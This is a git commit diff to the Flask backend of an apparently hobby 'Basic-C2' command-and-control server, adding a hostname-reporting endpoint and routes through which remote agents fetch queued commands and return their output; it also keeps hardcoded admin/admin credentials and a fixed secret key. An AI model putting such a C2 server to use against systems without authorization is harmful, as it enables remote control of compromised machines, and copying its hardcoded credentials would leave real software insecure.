d3d617e83a5adc981856a8b2d2a2eaf277c4b859
zevuxo1 <155918223+zevuxo1@users.noreply.github.com>
2024-08-22 04:31:27 +1000

    Update app.py

--- C-Projects/Basic-C2/Backend/app.py
+++ C-Projects/Basic-C2/Backend/app.py
@@ -1,13 +1,5 @@
 from flask import Flask, render_template, request, redirect, url_for, session
 
-# FIX COMMAND NOT CHANGING BACK TO EMTPY
-# DO CSS FOR /INPUT 
-# ADD COMPUTER IDENTIFIERS
-# MAKE HTML BETTER FOR /INPUT SHIT SO FUCKING TRASH RIGHT NOW
-
-# Note To Self, Web Dev Fucking Sucks
-
-
 app = Flask(__name__)
 app.secret_key = 'supersecretkey'  # Necessary for flash messages
 
@@ -15,6 +7,7 @@ username = "admin"
 password = "admin"
 output = ""
 command = ""
+name = ""
 ##com_output = None
 
 @app.route("/login", methods=['POST', 'GET'])
@@ -32,10 +25,22 @@ def login():
     return render_template("login.html")
 
 
+@app.route("/hostname", methods=['POST', 'GET'])
+def hostname():
+    if request.method == "POST":
+        global name
+        name = request.form.get('hostname')
+        return '', 200
+    else:
+        return name
+
+
+
 @app.route("/input", methods=['GET', 'POST'])
 def input():
     out = output
-    return render_template("input.html", output=out)
+    names = name
+    return render_template("input.html")
 
 @app.route("/update_command", methods=['POST'])
 def update_command():
@@ -50,16 +55,19 @@ def get_command():
     if command:
         return command
     else:
-        return "No command available."
+        return "Nope"
 
-@app.route("/send_command", methods=['POST'])
+@app.route("/send_command", methods=['POST', 'GET'])
 def send_command():
     if request.method == "POST":
+        global command
         command = ""
         global output
         output = request.form.get('output') # Store the output in the session
        
         return '', 204  # Return no content to avoid redirection or message
+    else:
+        return output
         
         
 if __name__ == '__main__':
